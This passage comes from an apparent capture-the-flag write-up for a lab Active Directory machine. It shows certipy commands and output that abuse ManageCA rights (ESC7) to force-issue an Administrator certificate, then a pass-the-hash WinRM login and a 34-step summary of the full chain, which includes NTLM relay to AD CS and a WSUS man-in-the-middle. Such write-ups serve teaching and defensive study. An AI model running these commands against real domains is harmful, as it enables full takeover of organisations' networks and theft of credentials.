```

Step 3 — use aaron.b's **ManageCA** rights to manually approve/issue the previously-denied request:

```bash
certipy ca -ca 'trustfall-DC01-CA' -issue-request 12 -username aaron.b@trustfall.htb -p '[REDACTED]' \
  -dc-ip 10.129.xx.xx -target-ip 10.129.xx.xx
```
```
[*] Successfully issued certificate request ID 12
```

Step 4 — retrieve the now-issued certificate:

```bash
certipy req -ca 'trustfall-DC01-CA' -username aaron.b@trustfall.htb -p '[REDACTED]' -dc-ip 10.129.xx.xx \
  -target-ip 10.129.xx.xx -retrieve 12
```
```
[*] Got certificate with UPN 'administrator@trustfall.htb'
[*] Certificate has no object SID
[*] Wrote certificate and private key to 'administrator.pfx'
```

First auth attempt failed a modern Kerberos strong-mapping check — the certificate has a UPN claiming to be Administrator, but no matching **objectSid** extension, so the KDC refuses to trust the mapping:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.xx.xx
```
```
[-] Object SID mismatch between certificate and user 'administrator'
[-] See the wiki for more information
```

The Administrator account's real SID was resolved via SID brute-forcing over LSA:

```bash
impacket-lookupsid aaron.b@10.129.xx.xx
```
```
[*] Domain SID is: S-1-5-21-321399640-1940743330-3713521093
500: TRUSTFALL\Administrator (SidTypeUser)
501: TRUSTFALL\Guest (SidTypeUser)
502: TRUSTFALL\krbtgt (SidTypeUser)
```

The whole request/issue/retrieve sequence was repeated, this time explicitly embedding the correct SID (`...-500`) into the certificate request so it passes strong mapping:

```bash
certipy req -ca 'trustfall-DC01-CA' -username aaron.b@trustfall.htb -p '[REDACTED]' -dc-ip 10.129.xx.xx \
  -target-ip 10.129.xx.xx -template SubCA -upn administrator@trustfall.htb \
  -sid S-1-5-21-321399640-1940743330-3713521093-500
```
```
[*] Request ID is 13
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED
```

```bash
certipy ca -ca 'trustfall-DC01-CA' -issue-request 13 -username aaron.b@trustfall.htb -p '[REDACTED]' \
  -dc-ip 10.129.xx.xx -target-ip 10.129.xx.xx
```
```
[*] Successfully issued certificate request ID 13
```

```bash
certipy req -ca 'trustfall-DC01-CA' -username aaron.b@trustfall.htb -p '[REDACTED]' -dc-ip 10.129.xx.xx \
  -target-ip 10.129.xx.xx -retrieve 13
```
```
[*] Certificate object SID is 'S-1-5-21-321399640-1940743330-3713521093-500'
[*] Wrote certificate and private key to 'administrator.pfx'
```

---

## 38. Domain Administrator & Root Flag

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.xx.xx
```

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator@trustfall.htb'
[*]     SAN URL SID: 'S-1-5-21-321399640-1940743330-3713521093-500'
[*] Trying to get TGT...
[*] Got TGT
[*] Got hash for 'administrator@trustfall.htb': aad3b435b51404eeaad3b435b51404ee:[REDACTED]
```

```bash
evil-winrm -i 10.129.xx.xx -u Administrator -H [REDACTED-NT-HASH]
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```powershell
type root.txt
```
```
[REDACTED — ROOT FLAG]
```

**Domain Administrator obtained. Box owned.**

---

## 39. Step-by-Step Summary

1. **Recon:** `nmap` shows a dual-purpose host answering both Linux mail/ticketing services and a full Windows AD Domain Controller stack.
2. **Anonymous FTP** exposes a "temporary" mail-migration backup that should have been deleted, containing old Dovecot password hashes **and** a document that literally spells out the company's password-construction pattern.
3. Using that leaked pattern, a tiny **targeted wordlist** (~1,000 candidates) cracks three mailbox passwords with hashcat in seconds — versus a huge generic wordlist.
4. **Vhost fuzzing** discovers `ticket.trustfall.htb` (osTicket) and `mailsrv.trustfall.htb` (Roundcube). One cracked password (`salvador`) works on webmail (empty inbox) — confirming reuse and pointing effort at osTicket next.
5. osTicket is vulnerable to **CVE-2026-22200** (unauthenticated arbitrary file read via PDF export filter chains). Using salvador's reused webmail password to authenticate, `/etc/passwd` and osTicket's own config file are read, leaking **DB credentials** and, critically, the app's **SECRET_SALT**.
6. With the salt leaked, a valid ticket ID/email pair is found by brute-forcing the "email me a link" lookup form, then a **ticket access link is forged offline** — bypassing the need to actually receive an email.
7. The forged link opens a ticket where a user uploaded his entire **`.ssh` folder** as an attachment by mistake — including a private key that is authorized for a different local account (`martin`).
8. SSH in as **martin** → low-priv foothold on the Linux host (`ticket01`).
9. Local telnet is vulnerable to **CVE-2026-24061** (GNU inetutils telnetd auth bypass via the `USER` environment variable) → instant **root** on `ticket01`.
10. Apache logs reveal a second, internal `192.168.1.0/24` network; a down second NIC is brought up, and the internal DC (`.32`) and a workstation `WS01` (`.64`) are found.
11. osTicket's local database (creds leaked in step 5) contains support tickets describing an internal outage — crucially, that a user **repeatedly, periodically** tries to RDP from WS01 to an offline WS02.
12. A **ligolo-ng** tunnel is set up through `ticket01` to route traffic into the internal segment.
13. WS02's IP is claimed on the pivot box; when the periodic RDP attempt arrives, it's forwarded to **Responder**, capturing an **NTLMv2** login for `david.m`. Cracking attempt against rockyou fails, so instead of cracking it offline the hash is **relayed live**.
14. `ntlmrelayx` relays that captured RDP auth straight into **AD CS HTTP Web Enrollment** (ESC8-style, no EPA), obtaining a client certificate for `david.m` with **no password needed**.
15. The certificate is used with `certipy` to get a Kerberos TGT and NT hash for `david.m`; full **BloodHound** collection is run.
16. david.m has write access to a disabled user (`luis.mody`) — the account is **re-enabled** and flagged for **AS-REP Roasting** (`DONT_REQ_PREAUTH`) instead of trying a blind password reset.
17. The AS-REP hash cracks instantly against the **same company password pattern** discovered in step 2 (used across mail *and* AD accounts).
18. luis.mody's password is rotated via `kpasswd`; as a **Leadership** group member he has **GenericWrite/WriteDACL** on the `TrustFall-Users` OU. A DACL edit grants himself **FullControl** over that OU, then he force-resets **jake.r**'s password directly.
19. **jake.r** gets WinRM on **WS01**. A saved **WinSCP** session config on that box has an encrypted MinIO password, decoded with a small utility.
20. MinIO holds a Windows **Credential Manager export** (`.crd`), protected by a password documented right next to it in a README.
21. The `.crd` is decrypted (reimported + **Mimikatz** `sekurlsa::credman` on an admin-privileged Windows host), revealing **two `sql_svc` passwords and two `it.junior` passwords** tied to different internal SQL hosts.
22. Password-spraying those four passwords against the domain proves **one real reuse case**: `sql_svc`'s domain password matches one of the recovered SQL-host passwords.
23. BloodHound shows `sql_svc` → `IT` group → **Enroll** rights on a `WebServer-HTTPS` certificate template, matching a known **WSUS + AD CS MITM** attack chain (confirmed by WSUS registry keys on WS01).
24. `sql_svc` adds itself to `IT`, requests a `WebServer-HTTPS` certificate impersonating the DC's own hostname, and converts it for use as a TLS identity.
25. A **tinyproxy** relay gives the isolated pivot box internet access to install `wsuks`; a Python 3.12 argparse bug is patched by hand.
26. **`wsuks`** ARP-spoofs WS01 into trusting the attacker as the real WSUS server (using the forged cert for TLS trust) and pushes a fake "update" (`PsExec64.exe`) that adds `jake.r` to WS01's local **Administrators** group. Triggered manually with `wuauclt /detectnow`.
27. **User flag** captured. SAM/SECURITY/SYSTEM hives are dumped locally and parsed offline with `secretsdump`, revealing a local account `tom.k-local` and its NT hash.
28. That local hash is directly reused by a **domain** account `tom.k` — pass-the-hash straight onto the **Domain Controller**.
29. On the DC, a legacy `Reset-User.vbs` admin script generates "random" reset passwords using VBScript's **time-seeded, non-cryptographic** `Randomize`/`Rnd`. A log file gives the exact timestamp of a real reset for user `aaron.b`.
30. A small PoC script + PowerShell loop **regenerate every possible token** for that time window (129 candidates) by reproducing VBScript's PRNG seeding logic — spraying them recovers `aaron.b`'s real password.
31. BloodHound shows `aaron.b` is in **PKI Managers**, with **ManageCA** rights on the Enterprise CA — a textbook **ESC7**.
32. The `SubCA` template is enabled, a certificate request impersonating Administrator (with the correct object SID to satisfy strong certificate mapping) is submitted, denied, then **manually force-issued** using the ManageCA right, and finally retrieved.
33. That certificate authenticates as **Administrator**, yielding the Administrator's NT hash and a full WinRM session as **Domain Admin**.
34. **Root flag** captured — domain fully compromised.
